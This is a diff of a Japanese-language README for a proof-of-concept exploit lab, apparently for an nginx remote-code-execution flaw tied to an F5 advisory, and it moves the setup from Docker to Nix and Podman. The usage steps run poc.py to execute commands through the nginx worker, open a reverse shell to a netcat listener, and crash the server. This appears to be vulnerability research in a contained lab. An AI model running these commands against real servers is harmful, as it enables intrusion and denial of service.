@@ -28,7 +28,7 @@ Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>
 
 ## Requirements
 
-- Docker + Docker Compose
+- Nix（flakes 有効）+ Podman
 - Python 3
 
 ## Usage
@@ -38,10 +38,10 @@ Tested on Ubuntu 24.04.3 LTS.
 ### 1. ビルド（初回のみ）
 
 ```bash
-./setup.sh
+./start.sh
 ```
 
-nginx をソースからコンパイルするため数分かかります。
+初回はイメージが存在しないため自動でビルドします（nginx をソースからコンパイルするため数分かかります）。
 
 ### 2. 起動
 
@@ -60,10 +60,9 @@ python3 poc.py --cmd 'id > /tmp/pwned'
 ```
 
 exploit が成功すると nginx worker が `system()` を実行してクラッシュします。
-コマンドの出力は `env/poc-output/` にマウントされているため、コンテナ停止後も確認できます：
 
 ```bash
-cat env/poc-output/pwned
+podman exec nginx-rift-poc cat /tmp/pwned
 ```
 
 **インタラクティブシェルモード:**
@@ -73,7 +72,7 @@ cat env/poc-output/pwned
 nc -l -p 1337
 
 # ターミナル2: exploit 実行
-python3 poc.py --shell --listen-ip 172.17.0.1 --listen-port 1337
+python3 poc.py --shell --listen-ip 10.88.0.1 --listen-port 1337
 ```
 
 **クラッシュ確認モード（DoS 影響の検証）:**
@@ -92,20 +91,4 @@ python3 poc.py --cmd 'true'
 
 ```bash
 ./stop.sh
-```
-
----
-
-> **注意:** exploit 後に nginx master プロセスも終了してコンテナが停止する場合があります。
-> その場合は `cat env/poc-output/pwned` で RCE を確認してください（`docker compose exec` は使えません）。
-
-## Alternative: Nix + Podman
-
-Docker の代わりに Nix + Podman を使う場合は `nix-setup.sh` を使用します：
-
-```bash
-./nix-setup.sh build   # イメージビルド
-./nix-setup.sh start   # 起動
-./nix-setup.sh poc --cmd 'id > /tmp/pwned'  # exploit
-./nix-setup.sh stop    # 停止
 ```
